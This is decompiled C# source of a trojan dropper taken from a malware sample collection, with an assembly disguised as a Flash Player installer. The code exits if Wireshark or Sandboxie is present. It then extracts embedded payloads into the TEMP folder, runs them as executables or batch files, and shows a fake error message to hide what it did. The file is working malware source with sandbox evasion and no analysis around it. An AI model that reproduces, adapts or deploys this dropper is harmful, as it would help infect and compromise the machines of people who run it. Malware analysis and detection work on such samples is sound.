// Decompiled with JetBrains decompiler
// Type: Stub.Program
// Assembly: install_flash_player, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4935254A-EC1D-4C51-A7B4-0EC6BA669F86
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00007-msil\Trojan.Win32.Inject.ggvy-efa96f3bf97d176aa1254f2dcb8f96cf4dc1a78d88e3453a99514f442caffb5b.exe

using System;
using System.Collections;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace Stub
{
  internal class Program
  {
    public static FileStream F1Stream;
    public static FileStream F2Stream;
    public static FileStream F3Stream;

    [DllImport("kernel32.dll")]
    public static extern bool FreeConsole();

    [DllImport("user32.dll")]
    public static extern int FindWindow(string strclassName, string strWindowName);

    private static void Main(string[] args)
    {
      try
      {
        Program.FreeConsole();
        bool flag1 = false;
        bool flag2 = false;
        bool flag3 = false;
        bool flag4 = true;
        bool flag5 = false;
        bool flag6 = false;
        bool flag7 = false;
        bool flag8 = false;
        string text = "";
        if (flag6 && Program.FindWindow("gdkWindowToplevel", "The Wireshark Network Analyzer") != 0)
        {
          if (flag8)
          {
            int num = (int) MessageBox.Show(text, "Error!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
            Environment.Exit(0);
          }
          Environment.Exit(0);
        }
        if (flag7)
        {
          try
          {
            foreach (ProcessModule module in (ReadOnlyCollectionBase) Process.GetCurrentProcess().Modules)
            {
              if (module.ModuleName == "SbieDll.dll")
              {
                if (flag8)
                {
                  int num = (int) MessageBox.Show(text, "Error!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
                  Environment.Exit(0);
                }
                Environment.Exit(0);
              }
            }
          }
          catch
          {
          }
        }
        Stream manifestResourceStream1 = Assembly.GetExecutingAssembly().GetManifestResourceStream("1.txt");
        byte[] buffer1 = new byte[manifestResourceStream1.Length];
        manifestResourceStream1.Read(buffer1, 0, buffer1.Length);
        manifestResourceStream1.Close();
        Stream manifestResourceStream2 = Assembly.GetExecutingAssembly().GetManifestResourceStream("2.txt");
        byte[] buffer2 = new byte[manifestResourceStream2.Length];
        manifestResourceStream2.Read(buffer2, 0, buffer2.Length);
        Program.F1Stream = !flag1 ? (!flag2 ? new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\1.exe", FileMode.Create) : new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\1.mp3", FileMode.Create)) : new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\1.jpg", FileMode.Create);
        Program.F1Stream.Write(buffer1, 0, buffer1.Length);
        Program.F1Stream.Close();
        Program.F1Stream.Dispose();
        Program.F2Stream = !flag3 ? new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\2.exe", FileMode.Create) : new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\2.bat", FileMode.Create);
        Program.F2Stream.Write(buffer2, 0, buffer2.Length);
        Program.F2Stream.Close();
        Program.F2Stream.Dispose();
        Process process1 = new Process();
        process1.StartInfo.FileName = !flag1 ? (!flag2 ? Environment.GetEnvironmentVariable("TEMP") + "\\1.exe" : Environment.GetEnvironmentVariable("TEMP") + "\\1.mp3") : Environment.GetEnvironmentVariable("TEMP") + "\\1.jpg";
        process1.Start();
        if (flag4)
          process1.WaitForExit();
        Process process2 = new Process();
        process2.StartInfo.FileName = !flag3 ? Environment.GetEnvironmentVariable("TEMP") + "\\2.exe" : Environment.GetEnvironmentVariable("TEMP") + "\\2.bat";
        process2.Start();
        process2.WaitForExit();
        if (flag5)
        {
          Stream manifestResourceStream3 = Assembly.GetExecutingAssembly().GetManifestResourceStream("3.txt");
          byte[] buffer3 = new byte[manifestResourceStream3.Length];
          manifestResourceStream3.Read(buffer3, 0, buffer3.Length);
          Program.F3Stream = new FileStream(Environment.GetEnvironmentVariable("TEMP") + "\\3.exe", FileMode.Create);
          Program.F3Stream.Write(buffer3, 0, buffer3.Length);
          Program.F3Stream.Close();
          Program.F3Stream.Dispose();
          Process process3 = new Process();
          process3.StartInfo.FileName = Environment.GetEnvironmentVariable("TEMP") + "\\3.exe";
          process3.Start();
          process3.WaitForExit();
        }
        int num1 = (int) MessageBox.Show(text, "Error!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
        Environment.Exit(0);
      }
      catch
      {
      }
    }
  }
}
